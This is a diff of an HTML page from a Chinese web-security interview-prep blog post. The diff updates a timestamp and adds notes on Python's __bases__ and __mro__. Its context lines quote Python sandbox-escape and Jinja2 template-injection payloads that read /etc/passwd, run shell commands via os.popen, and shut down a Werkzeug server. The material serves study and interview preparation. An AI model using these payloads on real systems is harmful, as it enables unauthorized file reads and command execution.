@@ -90,7 +90,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-1cf2ea307bdeb74a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="http://m3lon.github.io/Users/m3lon/Desktop/面经/ssrf.jpg">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png">
-<meta property="og:updated_time" content="2020-03-16T10:39:43.193Z">
+<meta property="og:updated_time" content="2020-03-16T10:41:12.279Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全面试准备一">
 <meta name="twitter:description" content="之前实习面试时准备的资料，现在论文和工作都差不多定了，想起来可以分享一下，其中很多资料源于网络，也包含了部分自己的理解，现在回馈于网络，希望对准备面试的小伙伴们或许能起到一点帮助 OWASP TOP 10 注入 失效的身份认证（密码转储、字典攻击、钓鱼或社会工程之后发现失效的身份认证） 敏感数据泄漏（攻击者不是直接攻击，而是在传输过程中或从客户端窃取密钥、中间人攻击或者从服务器端窃取明文数据） X">
@@ -982,8 +982,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">文件操作：</span><br><span class="line">object.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line">object.__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)</span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>
 <p>Python3(没有file，所以用的是open):</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">文件操作</span><br><span class="line">根据__class__是个str类型，根据__mro__(或者__base__)找到object，再由__subclasses__找到object的所有子类，然后调用其中的file属性实现任意文件读取。</span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">命令执行</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27eval%27](&quot;__import__(%27os%27).popen(%27id%27).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令执行：</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123;c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">文件操作</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;filename&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">&#123;&#123;request.environ[‘werkzeug.server.shutdown&apos;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>1. </li>
+<li><p>补充：</p>
+<ul>
+<li><code>__bases__</code>：直接基类</li>
+<li><code>__mro__</code>:  Method Resolution Order 方法解析顺序，对于python这种支持多继承的语言，MRO比较复杂，主要用于多继承时判断属性的路径（来自于哪个类）</li>
+</ul>
 </li>
-<li></li>
+</ul>
+</li>
 </ul>
 <h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞 "></a><a href="https://github.com/PyxYuYu/MyBlog/issues/102" target="_blank" rel="noopener">逻辑漏洞 </a></h3><ul>
 <li>任意密码重置<ul>
